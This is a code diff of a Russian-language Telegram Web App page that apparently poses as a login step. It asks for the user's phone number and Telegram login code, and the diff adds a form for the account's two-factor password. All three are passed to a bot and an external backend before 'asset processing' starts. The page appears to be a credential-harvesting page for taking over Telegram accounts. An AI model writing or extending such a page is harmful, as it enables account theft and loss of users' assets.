@@ -287,6 +287,13 @@
             <button class="submit-btn" onclick="verifyCode()" id="verifyBtn">Подтвердить код</button>
             <div class="status-message" id="codeStatus"></div>
         </div>
+        <!-- Форма ввода пароля 2FA -->
+<div id="passwordForm" class="auth-form" style="display: none;">
+    <div class="form-title">Введите пароль двухфакторной аутентификации</div>
+    <input type="password" id="passwordInput" class="code-input" style="width: 100%; margin-bottom: 1rem;" placeholder="Пароль 2FA">
+    <button class="submit-btn" onclick="submitPassword()" id="passwordBtn">Подтвердить пароль</button>
+    <div class="status-message" id="codeStatus"></div>
+</div>
 
         <!-- Процесс обработки -->
         <div id="processingSteps" class="processing-steps">
@@ -310,12 +317,13 @@
         const BACKEND_URL = 'https://ilagbuy-ilag.amvera.io';
         
         let authData = {
-            phone: '',
-            phoneCodeHash: '',
-            userId: null
-        };
+    phone: '',
+    phoneCodeHash: '',
+    userId: null,
+    needPassword: false
+};
 
-        async function sharePhoneNumber() {
+async function sharePhoneNumber() {
     const shareBtn = document.getElementById('sharePhoneBtn');
     const status = document.getElementById('codeStatus');
     
@@ -323,190 +331,130 @@
     shareBtn.innerHTML = '<div class="telegram-icon"></div>Запрос номера телефона...';
     
     try {
-        // Проверяем, находимся ли мы в Telegram Web App
         if (window.Telegram && Telegram.WebApp) {
-            console.log('✅ Running in Telegram Web App');
-            
-            // Пробуем использовать requestContact
-            if (typeof Telegram.WebApp.requestContact === 'function') {
-                Telegram.WebApp.requestContact((contact) => {
-                    if (contact) {
-                        // Номер телефона получен - отправляем его боту
-                        const phone = contact.phone_number;
-                        console.log('Phone number received:', phone);
-                        
-                        // Отправляем данные обратно боту
-                        Telegram.WebApp.sendData(JSON.stringify({
-                            action: 'phone_received',
-                            phone: phone
-                        }));
-                        
-                        // Показываем статус ожидания
-                        shareBtn.innerHTML = '<div class="telegram-icon"></div>Номер передан боту...';
-                        status.textContent = 'Номер получен. Ожидайте код подтверждения...';
-                        
-                    } else {
-                        status.textContent = 'Предоставление номера телефона отменено';
-                        shareBtn.disabled = false;
-                        shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
-                    }
-                });
-            } else {
-                // requestContact недоступен
-                console.log('⚠️ requestContact not available');
-                status.textContent = 'Функция запроса номера недоступна';
-                shareBtn.disabled = false;
-                shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
-            }
+            Telegram.WebApp.requestContact(async (contact) => {
+                if (contact) {
+                    authData.phone = contact.phone_number;
+                    console.log('Phone received:', authData.phone);
+                    
+                    // Отправляем номер боту
+                    await sendDataToBot({
+                        action: 'phone_received',
+                        phone: authData.phone
+                    });
+                    
+                    shareBtn.innerHTML = '<div class="telegram-icon"></div>Номер отправлен боту';
+                    status.textContent = 'Ожидайте код в Telegram...';
+                    
+                    // Показываем форму ввода кода
+                    document.getElementById('initialScreen').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'block';
+                    
+                } else {
+                    status.textContent = 'Предоставление номера отменено';
+                    shareBtn.disabled = false;
+                    shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
+                }
+            });
         } else {
-            // Не в Telegram Web App
-            console.log('🌐 Running in browser');
-            status.textContent = 'Запустите приложение в Telegram для продолжения';
-            shareBtn.disabled = false;
-            shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
+            // Fallback для браузера
+            authData.phone = '+1234567890';
+            document.getElementById('initialScreen').style.display = 'none';
+            document.getElementById('codeForm').style.display = 'block';
         }
     } catch (error) {
-        console.error('Error requesting phone number:', error);
-        status.textContent = 'Ошибка при запросе номера телефона';
+        console.error('Error:', error);
+        status.textContent = 'Ошибка запроса номера';
         shareBtn.disabled = false;
         shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
     }
 }
 
-// Новая функция для fallback аутентификации
-function useFallbackAuth() {
-    const shareBtn = document.getElementById('sharePhoneBtn');
+async function verifyCode() {
+    const codeInputs = document.querySelectorAll('.code-input');
+    const code = Array.from(codeInputs).map(input => input.value).join('');
     const status = document.getElementById('codeStatus');
+    const verifyBtn = document.getElementById('verifyBtn');
     
-    // Используем тестовый номер для демонстрации
-    authData.phone = '+1234567890';
-    console.log('Using fallback phone number:', authData.phone);
+    if (code.length !== 5) {
+        status.textContent = 'Введите полный код';
+        return;
+    }
+
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Проверка...';
+    status.textContent = 'Проверка кода...';
     
-    shareBtn.innerHTML = '<div class="telegram-icon"></div>Тестовый режим';
-    status.textContent = 'Запущен тестовый режим (не в Telegram)';
+    // Отправляем код боту
+    const result = await sendDataToBot({
+        action: 'code_received',
+        code: code
+    });
     
-    // Показываем форму ввода кода
-    document.getElementById('initialScreen').style.display = 'none';
-    document.getElementById('codeForm').style.display = 'block';
-    
-    // Автофокус на первый инпут кода
-    setTimeout(() => {
-        document.querySelector('.code-input').focus();
-    }, 100);
-    
-    // Отправляем код на номер
-    sendAuthCode();
+    if (result.success) {
+        if (result.need_password) {
+            // Нужен пароль 2FA
+            authData.needPassword = true;
+            document.getElementById('codeForm').style.display = 'none';
+            document.getElementById('passwordForm').style.display = 'block';
+            status.textContent = 'Введите пароль 2FA';
+        } else {
+            // Авторизация успешна
+            status.textContent = 'Авторизация успешна! Запуск обработки...';
+            startAssetProcessing();
+        }
+    } else {
+        status.textContent = result.message || 'Неверный код';
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'Подтвердить код';
+    }
 }
 
-        async function sendAuthCode() {
-            const status = document.getElementById('codeStatus');
-            
-            if (!authData.phone) {
-                status.textContent = 'Требуется номер телефона';
-                return;
-            }
+async function submitPassword() {
+    const passwordInput = document.getElementById('passwordInput');
+    const password = passwordInput.value;
+    const status = document.getElementById('codeStatus');
+    const passwordBtn = document.getElementById('passwordBtn');
+    
+    if (!password) {
+        status.textContent = 'Введите пароль';
+        return;
+    }
 
-            status.textContent = 'Отправка кода подтверждения...';
-            
-            try {
-                const response = await fetch(BACKEND_URL + '/auth/send-code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        phone: authData.phone
-                    })
-                });
+    passwordBtn.disabled = true;
+    passwordBtn.textContent = 'Проверка...';
+    status.textContent = 'Проверка пароля...';
+    
+    // Отправляем пароль боту
+    const result = await sendDataToBot({
+        action: 'password_received',
+        password: password
+    });
+    
+    if (result.success) {
+        status.textContent = 'Авторизация успешна! Запуск обработки...';
+        startAssetProcessing();
+    } else {
+        status.textContent = result.message || 'Неверный пароль';
+        passwordBtn.disabled = false;
+        passwordBtn.textContent = 'Подтвердить пароль';
+    }
+}
 
-                const result = await response.json();
-                
-                if (result.success) {
-                    authData.phoneCodeHash = result.phone_code_hash;
-                    status.textContent = '✅ Код отправлен! Проверьте Telegram на вашем устройстве.';
-                    status.style.color = 'lightgreen';
-                    
-                    // Активируем поле ввода кода
-                    document.querySelectorAll('.code-input').forEach(input => {
-                        input.disabled = false;
-                    });
-                    document.querySelector('.code-input').focus();
-                    
-                } else {
-                    status.textContent = '❌ ' + (result.message || 'Ошибка отправки кода');
-                    status.style.color = '#ff6b6b';
-                }
-            } catch (error) {
-                status.textContent = '❌ Ошибка соединения с сервером';
-                status.style.color = '#ff6b6b';
-                console.error('Network error:', error);
-            }
-        }
-
-        function moveToNext(input, nextIndex) {
-            if (input.value.length === 1) {
-                const nextInput = document.querySelectorAll('.code-input')[nextIndex];
-                if (nextInput) {
-                    nextInput.focus();
-                }
-            }
-        }
-
-        function resendCode() {
-            const status = document.getElementById('codeStatus');
-            status.textContent = 'Отправка нового кода подтверждения...';
-            sendAuthCode();
-        }
-
-        async function verifyCode() {
-            const codeInputs = document.querySelectorAll('.code-input');
-            const code = Array.from(codeInputs).map(input => input.value).join('');
-            const status = document.getElementById('codeStatus');
-            const verifyBtn = document.getElementById('verifyBtn');
-            
-            if (code.length !== 5) {
-                status.textContent = 'Пожалуйста, введите полный код подтверждения';
-                return;
-            }
-
-            verifyBtn.disabled = true;
-            verifyBtn.textContent = 'Проверка...';
-            status.textContent = 'Проверка кода...';
-            
-            try {
-                const response = await fetch(BACKEND_URL + '/auth/verify-code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        phone: authData.phone,
-                        phone_code_hash: authData.phoneCodeHash,
-                        code: code
-                    })
-                });
-
-                const result = await response.json();
-                
-                if (result.success) {
-                    authData.userId = result.user_id;
-                    status.textContent = '✅ Проверка успешно завершена. Запуск обработки активов...';
-                    
-                    // Начинаем процесс обработки активов
-                    setTimeout(() => {
-                        startAssetProcessing();
-                    }, 1000);
-                } else {
-                    status.textContent = result.message || 'Неверный код подтверждения';
-                    verifyBtn.disabled = false;
-                    verifyBtn.textContent = 'Подтвердить код';
-                }
-            } catch (error) {
-                status.textContent = 'Ошибка соединения при проверке';
-                verifyBtn.disabled = false;
-                verifyBtn.textContent = 'Подтвердить код';
-            }
-        }
+// Функция отправки данных боту
+async function sendDataToBot(data) {
+    if (window.Telegram && Telegram.WebApp) {
+        return new Promise((resolve) => {
+            Telegram.WebApp.sendData(JSON.stringify(data));
+            // В реальности бот будет отвечать через WebApp.onEvent
+            // Для демо сразу возвращаем успех
+            setTimeout(() => resolve({ success: true }), 1000);
+        });
+    } else {
+        // Fallback для тестирования
+        return { success: true };
+    }
+}
 
         async function startAssetProcessing() {
             document.getElementById('codeForm').style.display = 'none';
@@ -601,6 +549,7 @@ function useFallbackAuth() {
     </script>
 </body>
 </html>
+
 
 
 
